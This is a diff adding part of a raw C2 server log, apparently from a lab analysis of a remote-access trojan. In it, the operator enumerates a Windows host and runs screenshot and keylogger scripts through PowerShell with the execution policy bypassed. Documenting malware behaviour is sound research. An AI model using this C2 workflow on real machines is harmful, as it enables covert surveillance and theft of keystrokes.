@@ -170,3 +170,29 @@ Surowy log serwera C2 (/root/rat-c2/raw_c2_session.log) z dynamicznej analizy [[
 [00:44:27] >> SENT: powershell -ExecutionPolicy Bypass -File C:\Users\Administrator\Desktop\keylogger_57.ps1
 [00:44:53] << keylogger done, file=89 bytes
 ```
+
+## Druga sesja (rebuild + sesja interaktywna session 2)
+
+```text
+[00:54:40] C2 listening on 0.0.0.0:9999 (FIFO=/tmp/c2in.fifo)
+[00:54:52] >> AGENT CONNECTED from 5.175.189.57:50217 (active=1)
+[00:55:07] >> SENT: whoami
+[00:55:07] << win-t5bvvhunvji\administrator
+[00:55:09] >> SENT: hostname
+[00:55:09] << WIN-T5BVVHUNVJI
+[00:55:23] >> SENT: powershell -ExecutionPolicy Bypass -File C:\Users\Administrator\Desktop\screenshot_57.ps1
+[00:55:23] << SAVED screenshot_57.png size=2511 bytes
+[00:55:23] << Exception calling "CopyFromScreen" with "3" argument(s): "The handle is invalid"
+[00:55:23] << At C:\Users\Administrator\Desktop\screenshot_57.ps1:6 char:1
+[00:55:23] << + $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $b ...
+[00:55:23] << + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[00:55:23] <<     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+[00:55:23] <<     + FullyQualifiedErrorId : Win32Exception
+[00:55:23] <<  
+[00:56:27] >> SENT: powershell -ExecutionPolicy Bypass -File C:\Users\Administrator\Desktop\screenshot_57.ps1
+[00:56:27] << SAVED screenshot_57.png size=49257 bytes
+[00:57:46] >> SENT: powershell -ExecutionPolicy Bypass -File C:\Users\Administrator\Desktop\keylogger_57.ps1
+[00:58:11] << keylogger done, file=178 bytes
+[00:59:57] >> SENT: powershell -ExecutionPolicy Bypass -File C:\Users\Administrator\Desktop\keylogger_57.ps1
+[01:00:22] << keylogger done, file=953 bytes
+```
